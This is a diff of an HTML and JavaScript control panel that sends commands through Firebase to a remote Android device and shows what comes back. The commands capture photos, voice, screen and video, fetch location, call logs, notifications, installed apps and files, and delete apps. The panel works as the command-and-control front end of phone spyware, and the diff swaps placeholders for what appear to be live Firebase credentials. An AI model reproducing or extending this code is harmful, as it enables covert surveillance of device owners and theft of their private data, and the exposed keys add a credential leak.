@@ -1,194 +1,97 @@
+<!-- Full Admin Panel - Firebase Connected with Result Handling -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Admin Panel - Single User Control</title>
-<!-- FontAwesome CDN for icons -->
-<link
-  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
-  rel="stylesheet"
-/>
-<style>
-  /* Reset */
-  * {
-    box-sizing: border-box;
-  }
-
-  body {
-    margin: 0;
-    background: #121212;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    color: #eee;
-    display: flex;
-    flex-direction: column;
-    min-height: 100vh;
-    align-items: center;
-    padding: 20px;
-  }
-
-  h1 {
-    color: #4caf50;
-    margin-bottom: 10px;
-    text-shadow: 0 0 6px #4caf50aa;
-  }
-
-  .container {
-    background: #1f1f1f;
-    border-radius: 12px;
-    padding: 30px 40px;
-    max-width: 480px;
-    width: 100%;
-    box-shadow: 0 0 20px #4caf50aa;
-  }
-
-  .btn-grid {
-    display: grid;
-    grid-template-columns: repeat(2, 1fr);
-    gap: 18px 25px;
-  }
-
-  button.cmd-btn {
-    background: #282828;
-    border: none;
-    border-radius: 14px;
-    padding: 18px 20px;
-    color: #eee;
-    font-size: 18px;
-    font-weight: 600;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    box-shadow: 0 0 10px transparent;
-    transition: 
-      background-color 0.25s ease,
-      box-shadow 0.3s ease,
-      transform 0.15s ease;
-  }
-
-  button.cmd-btn:hover {
-    background: #4caf50;
-    color: #121212;
-    box-shadow: 0 0 12px #4caf50aa;
-    transform: translateY(-3px);
-  }
-
-  button.cmd-btn:active {
-    transform: translateY(0);
-    box-shadow: 0 0 5px #388e3c;
-  }
-
-  button.cmd-btn i {
-    font-size: 24px;
-    transition: transform 0.3s ease;
-  }
-
-  button.cmd-btn:hover i {
-    transform: rotate(15deg);
-  }
-
-  /* Log box */
-  #log {
-    margin-top: 28px;
-    background: #222;
-    border-radius: 10px;
-    padding: 14px 20px;
-    height: 180px;
-    overflow-y: auto;
-    font-family: monospace;
-    font-size: 14px;
-    box-shadow: inset 0 0 10px #111;
-  }
-
-  /* Footer */
-  footer {
-    margin-top: auto;
-    color: #666;
-    font-size: 13px;
-    user-select: none;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Admin Panel - Full Control</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet"/>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0; background: #121212; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #eee; display: flex; flex-direction: column; min-height: 100vh;
+      align-items: center; padding: 20px;
+    }
+    h1 { color: #4caf50; margin-bottom: 10px; text-shadow: 0 0 6px #4caf50aa; }
+    .container {
+      background: #1f1f1f; border-radius: 12px; padding: 30px 40px; max-width: 520px; width: 100%;
+      box-shadow: 0 0 20px #4caf50aa;
+    }
+    .btn-grid {
+      display: grid; grid-template-columns: repeat(2, 1fr); gap: 18px 25px;
+    }
+    button.cmd-btn {
+      background: #282828; border: none; border-radius: 14px;
+      padding: 18px 20px; color: #eee; font-size: 16px; font-weight: 600; cursor: pointer;
+      display: flex; align-items: center; gap: 10px;
+      transition: background-color 0.25s ease, box-shadow 0.3s ease, transform 0.15s ease;
+    }
+    button.cmd-btn:hover {
+      background: #4caf50; color: #121212; box-shadow: 0 0 12px #4caf50aa; transform: translateY(-3px);
+    }
+    button.cmd-btn:active { transform: translateY(0); box-shadow: 0 0 5px #388e3c; }
+    button.cmd-btn i { font-size: 20px; transition: transform 0.3s ease; }
+    button.cmd-btn:hover i { transform: rotate(15deg); }
+    #log {
+      margin-top: 25px; background: #222; border-radius: 10px; padding: 14px 20px;
+      height: 200px; overflow-y: auto; font-family: monospace; font-size: 14px;
+      box-shadow: inset 0 0 10px #111;
+    }
+    footer {
+      margin-top: auto; color: #666; font-size: 13px; user-select: none;
+    }
+    .result { margin-top: 20px; background: #1b1b1b; border-radius: 10px; padding: 15px; }
+    .result a, .result audio, .result video, .result img { display: block; margin-top: 8px; max-width: 100%; }
+  </style>
 </head>
 <body>
 
-<h1><i class="fas fa-tools"></i> Admin Panel</h1>
+<h1><i class="fas fa-user-shield"></i> Admin Panel</h1>
 
 <div class="container">
   <div class="btn-grid">
-    <button class="cmd-btn" onclick="sendCommand('take_photo')">
-      <i class="fas fa-camera"></i> Take Photo
-    </button>
-
-    <button class="cmd-btn" onclick="sendCommand('start_voice_record')">
-      <i class="fas fa-microphone"></i> Start Voice Record
-    </button>
-
-    <button class="cmd-btn" onclick="sendCommand('stop_voice_record')">
-      <i class="fas fa-stop-circle"></i> Stop Voice Record
-    </button>
-
-    <button class="cmd-btn" onclick="sendCommand('get_location')">
-      <i class="fas fa-location-dot"></i> Get Location
-    </button>
-
-    <button class="cmd-btn" onclick="sendCommand('start_screen_record')">
-      <i class="fas fa-video"></i> Start Screen Record
-    </button>
-
-    <button class="cmd-btn" onclick="sendCommand('stop_screen_record')">
-      <i class="fas fa-square"></i> Stop Screen Record
-    </button>
-
-    <button class="cmd-btn" onclick="sendCommand('get_notifications')">
-      <i class="fas fa-bell"></i> Get Notifications
-    </button>
-
-    <button class="cmd-btn" onclick="sendCommand('get_call_logs')">
-      <i class="fas fa-phone"></i> Get Call Logs
-    </button>
-
-    <button class="cmd-btn" onclick="sendCommand('get_installed_apps')">
-      <i class="fas fa-mobile-alt"></i> Installed Apps
-    </button>
-
-    <button class="cmd-btn" onclick="promptDeleteApp()">
-      <i class="fas fa-trash-alt"></i> Delete App
-    </button>
+    <button class="cmd-btn" onclick="sendCommand('take_photo')"><i class="fas fa-camera"></i> Take Photo</button>
+    <button class="cmd-btn" onclick="sendCommand('start_voice_record')"><i class="fas fa-microphone"></i> Start Voice</button>
+    <button class="cmd-btn" onclick="sendCommand('stop_voice_record')"><i class="fas fa-stop"></i> Stop Voice</button>
+    <button class="cmd-btn" onclick="sendCommand('start_screen_record')"><i class="fas fa-play-circle"></i> Start Screen</button>
+    <button class="cmd-btn" onclick="sendCommand('stop_screen_record')"><i class="fas fa-stop-circle"></i> Stop Screen</button>
+    <button class="cmd-btn" onclick="sendCommand('start_video_record')"><i class="fas fa-video"></i> Start Video</button>
+    <button class="cmd-btn" onclick="sendCommand('stop_video_record')"><i class="fas fa-video-slash"></i> Stop Video</button>
+    <button class="cmd-btn" onclick="sendCommand('get_location')"><i class="fas fa-location-dot"></i> Location</button>
+    <button class="cmd-btn" onclick="sendCommand('get_call_logs')"><i class="fas fa-phone"></i> Call Logs</button>
+    <button class="cmd-btn" onclick="sendCommand('get_installed_apps')"><i class="fas fa-list"></i> Installed Apps</button>
+    <button class="cmd-btn" onclick="sendCommand('get_file_manager')"><i class="fas fa-folder"></i> File Manager</button>
+    <button class="cmd-btn" onclick="sendCommand('get_notifications')"><i class="fas fa-bell"></i> Notifications</button>
+    <button class="cmd-btn" onclick="promptDeleteApp()"><i class="fas fa-trash"></i> Delete App</button>
   </div>
 
   <div id="log"></div>
+  <div class="result" id="results"></div>
 </div>
 
-<footer>Powered by Firebase &amp; Your System</footer>
+<footer>Connected via Firebase — Remote Access Panel</footer>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
 <script>
-  // Replace these with your Firebase project config
   const firebaseConfig = {
-    apiKey: "YOUR_API_KEY",
-    authDomain: "YOUR_PROJECT.firebaseapp.com",
-    databaseURL: "https://YOUR_PROJECT.firebaseio.com",
-    projectId: "YOUR_PROJECT",
-    storageBucket: "YOUR_PROJECT.appspot.com",
-    messagingSenderId: "SENDER_ID",
-    appId: "APP_ID"
+    apiKey: "AIzaSyDuA18mjQ9G6Yb6Pm7ZehjZOqUHuZq3LN0",
+    authDomain: "siamxn.firebaseapp.com",
+    databaseURL: "https://siamxn-default-rtdb.firebaseio.com",
+    projectId: "siamxn",
+    storageBucket: "siamxn.appspot.com",
+    messagingSenderId: "6369110312",
+    appId: "1:6369110312:android:85f86dd8841e79c995081d"
   };
 
-  // Initialize Firebase
   firebase.initializeApp(firebaseConfig);
   const db = firebase.database();
-
-  // Since single user, fixed userId here
   const userId = "singleUser";
 
   function sendCommand(command) {
-    if (command === 'delete_app') {
-      promptDeleteApp();
-      return;
-    }
-
+    if (command === 'delete_app') return;
     db.ref('commands/' + userId).update({
       [command]: true,
       timestamp: Date.now()
@@ -197,15 +100,12 @@
   }
 
   function promptDeleteApp() {
-    const appPackage = prompt("Enter app package name to delete (e.g. com.example.app):");
-    if (appPackage && appPackage.trim().length > 0) {
-      db.ref('commands/' + userId).update({
-        delete_app: appPackage.trim(),
-        timestamp: Date.now()
-      });
-      log(`Command sent: delete_app => ${appPackage.trim()}`);
+    const pkg = prompt("Enter app package name to delete:");
+    if (pkg) {
+      db.ref('commands/' + userId).update({ delete_app: pkg.trim(), timestamp: Date.now() });
+      log(`Command sent: delete_app → ${pkg}`);
     } else {
-      log('Delete app command cancelled or empty input');
+      log('Delete cancelled.');
     }
   }
 
@@ -215,6 +115,32 @@
     logBox.innerHTML += `[${time}] ${msg}<br>`;
     logBox.scrollTop = logBox.scrollHeight;
   }
+
+  // Result Listener
+  db.ref('results/' + userId).on('value', snap => {
+    const data = snap.val();
+    const box = document.getElementById('results');
+    box.innerHTML = '';
+    if (!data) return;
+    Object.keys(data).forEach(key => {
+      const value = data[key];
+      let content = `<b>${key}:</b><br>`;
+      if (typeof value === 'string' && value.startsWith('http')) {
+        if (value.includes('.mp3') || value.includes('.m4a')) {
+          content += `<audio controls src="${value}"></audio>`;
+        } else if (value.includes('.mp4')) {
+          content += `<video controls src="${value}"></video>`;
+        } else if (value.includes('.jpg') || value.includes('.png')) {
+          content += `<img src="${value}" />`;
+        } else {
+          content += `<a href="${value}" target="_blank">Download</a>`;
+        }
+      } else {
+        content += `<pre>${JSON.stringify(value, null, 2)}</pre>`;
+      }
+      box.innerHTML += content + '<hr>';
+    });
+  });
 </script>
 
 </body>
